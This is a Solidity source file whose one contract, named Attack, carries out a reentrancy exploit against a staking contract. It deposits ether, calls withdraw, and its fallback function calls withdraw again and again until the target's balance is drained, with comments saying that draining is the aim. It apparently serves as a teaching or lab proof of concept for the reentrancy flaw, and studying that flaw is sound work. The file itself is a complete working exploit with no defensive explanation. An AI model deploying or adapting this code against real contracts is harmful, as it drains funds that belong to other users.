// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

interface IStaking {
    function balances(address) external view returns (uint256);

    function deposit() external payable;

    function withdraw() external;
}

contract Attack {
    IStaking stakingContract;

    constructor(address _staking) {
        stakingContract = IStaking(_staking);
    }

    function attack() public payable {
        // Deposit to staking contract in order to begin to attack
        require(msg.value > 0, "Need deposit to attack");
        stakingContract.deposit{value: msg.value}();

        // Withdraw from the staking contract
        stakingContract.withdraw();
    }

    // Draining the staking contract
    fallback() external payable {
        // Keep withdrawing until the staking contract's balance is drained
        if (address(stakingContract).balance > 0) {
            stakingContract.withdraw();
        }
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
